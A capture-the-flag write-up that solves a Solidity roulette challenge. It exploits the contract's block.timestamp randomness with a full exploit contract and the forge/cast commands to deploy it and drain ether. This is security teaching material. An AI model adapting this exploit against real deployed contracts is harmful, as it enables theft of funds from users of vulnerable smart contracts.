In this Game, we need to have make the `stolenEnough()` bool returns true in order to solve the lab.

```solidity
contract Setup{
    Roulette public roulette;

    constructor() payable {
        roulette = new Roulette{value: 30 ether}();
    }

    function isSolved() public view returns(bool){
        return roulette.stolenEnough();
    }
}
```

Now let's see the `Roullete Contract`  

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract Roulette{

    bool public stolenEnough = false;
    mapping(address => uint) public wonRoulette;

    modifier _kickedOut(){
        require(wonRoulette[msg.sender] <= 100, "You've stolen enough, get out!");
        _;
    }

    modifier _hasStolenEnough(){
        _;
        if(address(msg.sender).balance > 20){
            stolenEnough = true;
        }
    }

    constructor() payable {}

    function randomGenerator() internal view returns(uint256){
        return uint256(keccak256(abi.encodePacked(block.timestamp))) % 100;
    }

    function biggerRandomGenerator() internal view returns(uint256){
        return uint256(keccak256(abi.encodePacked(block.timestamp))) % 10000000;
    }

    function playRoulette(uint256 _guess) public _kickedOut{
        require(wonRoulette[msg.sender] < 5, "You cannot play this game again!");
        uint256 playerGuess = _guess;
        uint256 randomNumber = randomGenerator();
        if(randomNumber == playerGuess){
            wonRoulette[msg.sender]++;
            (bool winningMoney, ) = msg.sender.call{value: 1 ether}("");
            require(winningMoney, "Fail to claim winning money");
        }
    }

    function playBiggerRoulette(uint256 _guess) public _kickedOut _hasStolenEnough{
        require(wonRoulette[msg.sender] >= 5, "You haven't met the requirement to play the game!");
        uint256 playerGuess = _guess;
        uint256 randomNumber = biggerRandomGenerator();
        if(randomNumber == playerGuess){
            wonRoulette[msg.sender] += 50;
            (bool winningMoney, ) = msg.sender.call{value: 10 ether}("");
            require(winningMoney, "Fail to claim winning money");
        }
    }
    
}
```

We have 2 modifiers up there, one is `_kickOut()` that will check whether we have scroe of winning about 100 or not, if we are then we can no longer play the game. The second one is `_hasStolenEnough()` this is the one which will check after all the code in the function is complete, if the balance of the player is greeater than 20 Ether, it will change the `stolenEnough` bool to true, so our goal here is to have a Balance greater than 20 Ether.

The first 2 functions below the constructor seems to be the generator of the source of the randomness, and it doesn't seem to be that secure since it use a predictable or at least we can also get that variable the `block.timestamp`, the only difference is the modulo. Both of them are used for different function, the `randomGenerator()` is used by `playRoullete()` and the `biggerRandomGenerator()` is used by `playBiggerRoulette()`. 

So we are dealing with an insecure randomness vulnerability here, let's see the `playRoulette()` first, if we manage to guess the correct number we will get 1 Ether and it adds our winning by 1, so we can only play this maximum of 5 times since when we reach 5 it will revert. The other one, `playBiggerRoullete()` seems to give more reward and won counter, but it require us to have at least 5 win already (so we need to play the smaller one first), if we managed to guess right, we will get 10 ether per win and it will add 50 winning point, so we can only play this twice since it has the `_kickedOut()` modifier and it will also validate our balance by the `_hasStolenEnough()` modifier.

So the Attack Idea here is to play the `playRoulette()` 5 times and then moving to the `playBiggerRoulette()` 2 times, it will give us 25 Ether in total, more than enough to make the `stolenEnough()` to become true, but we can't just play it since it has `block.timestamp` as the source of randomness, we need to make an Exploit contract here, it will look like this

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./Setup.sol";
import "./Roulette.sol";

contract exploit{
    Setup public setup;
    Roulette public roulette;

    constructor(address _setup) {
        setup = Setup(_setup);
        roulette = Roulette(setup.roulette());
    } 

    function randomGenerator() internal view returns(uint256){
        return uint256(keccak256(abi.encodePacked(block.timestamp))) % 100;
    }

    function biggerRandomGenerator() internal view returns(uint256){
        return uint256(keccak256(abi.encodePacked(block.timestamp))) % 10000000;
    }

    function playRoulette() public{
        uint256 answer = randomGenerator();
        uint256 bigAnswer = biggerRandomGenerator();
        for(uint i = 0; i < 5; i ++){
            roulette.playRoulette(answer);
        } 
        roulette.playBiggerRoulette(bigAnswer);
        roulette.playBiggerRoulette(bigAnswer);
    }

    receive() external payable { }    
}
```

Now we just need to deploy the contract and call the `playRoulette()` on our smart contract to solve it, here is how you can deploy the Exploit contract.

```bash
// Deploying the Exploit Contract
forge create src/roulette/$EXPLOIT_FILE:$EXPLOIT_NAME -r $RPC_URL --private-key $PK --constructor-args $SETUP_ADDR

// Call the playRoulette()
cast send -r $RPC_URL --private-key $PK $EXPLOIT_ADDR "playRoulette()"
```

By doing the command above, deploying the contract and calling it, you should've solved the lab!